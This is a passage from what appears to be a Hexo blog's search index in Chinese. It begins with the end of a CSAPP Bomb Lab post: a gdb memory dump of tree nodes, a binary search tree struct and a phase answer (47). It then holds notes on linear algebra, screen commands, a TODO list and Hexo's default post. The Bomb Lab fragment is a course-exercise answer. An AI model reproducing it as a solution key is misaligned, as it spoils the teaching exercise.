<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000007</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604280</span> &lt;n42+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x604290</span> &lt;n43&gt;: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000014</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6042a0</span> &lt;n43+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6042b0</span> &lt;n46&gt;: <span class="hljs-number">0</span>x000000000000002f      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6042c0</span> &lt;n46+<span class="hljs-number">16</span>&gt;:      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6042d0</span> &lt;n48&gt;: <span class="hljs-number">0</span>x000000<span class="hljs-number">00000003e9</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>二叉搜索树</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Tree</span>&#123;</span><br>    <span class="hljs-type">int</span> val;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Tree</span>* <span class="hljs-title">left</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Tree</span>* <span class="hljs-title">right</span>;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/Bomb-Lab/Tree.png" alt="二叉树"></p><p>返回值为5：右 左 右 0<br>47</p>]]></content>
    
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linear Algebra</title>
    <link href="/2023/08/17/Linear-Algebra/"/>
    <url>/2023/08/17/Linear-Algebra/</url>
    
    <content type="html"><![CDATA[<p>矩阵表示线性映射。</p><hr><p>线性方程组 <code>Ax=b</code> 对任意向量 $\vec{b}$：</p><ul><li>有唯一解：矩阵 A 可逆 (invertible)，x &#x3D; A^-1^b</li><li>无解：</li></ul><hr><p>矩阵 A &#x3D; ($\vec{u}$, $\vec{v}$, $\vec{w}$)</p><p>若 A 可逆，则 </p><ul><li>$\vec{u}$, $\vec{v}$, $\vec{w}$ 的全部线性组合是整个3维空间。</li><li>向量 $\vec{u}$, $\vec{v}$, $\vec{w}$ 线性无关 (linearly independent)。相应地，Ax &#x3D; $\vec{0}$ 只有零解。</li></ul><p>否则，$\vec{0}$ 可以写成 $\vec{u}$, $\vec{v}$, $\vec{w}$ 的多种线性组合。称矩阵 A 奇异 (singular)，向量 $ \vec{u}$, $\vec{v}$, $\vec{w}$ 线性相关。</p><br>总结：<p>若方阵 A 的列向量<strong>线性无关</strong>，则 A 可逆，Ax &#x3D; 0 只有零解；<br>若方阵 A 的列向量线性相关，则 A 奇异，Ax &#x3D; 0 有无穷多解。</p><hr>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>screen</title>
    <link href="/2023/08/14/screen/"/>
    <url>/2023/08/14/screen/</url>
    
    <content type="html"><![CDATA[<p>screen 是一个非常有用的命令，提供从单个 SSH 会话中使用多个 shell 窗口（会话）的能力。当会话被分离或网络中断时，screen 会话中启动的进程仍将运行，你可以随时重新连接到 screen 会话。如果你想运行一个持久的进程或者从多个位置连接到 shell 会话，这也很方便。</p><hr><h1 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h1><ul><li><p>新建 session<br>  <code>screen -S &lt;name&gt;</code></p></li><li><p>detach 子窗口<br>  Ctrl+a+d</p></li><li><p>列出当前所有的 session<br>  <code>screen -ls</code></p></li><li><p>再次进入 session<br>  <code>screen -r &lt;name&gt;</code></p></li><li><p>删除 session<br>  <code>screen -S &lt;name&gt; -X quit</code></p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>My First Post</title>
    <link href="/2023/08/11/My-First-Post/"/>
    <url>/2023/08/11/My-First-Post/</url>
    
    <content type="html"><![CDATA[<p>暑期 TODO</p><ul><li><input checked disabled type="checkbox"> hands on AI</li><li><input disabled type="checkbox"> missing semester</li><li><input disabled type="checkbox"> CODE</li></ul><br><p>GOGOGO!</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/11/hello-world/"/>
    <url>/2023/08/11/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
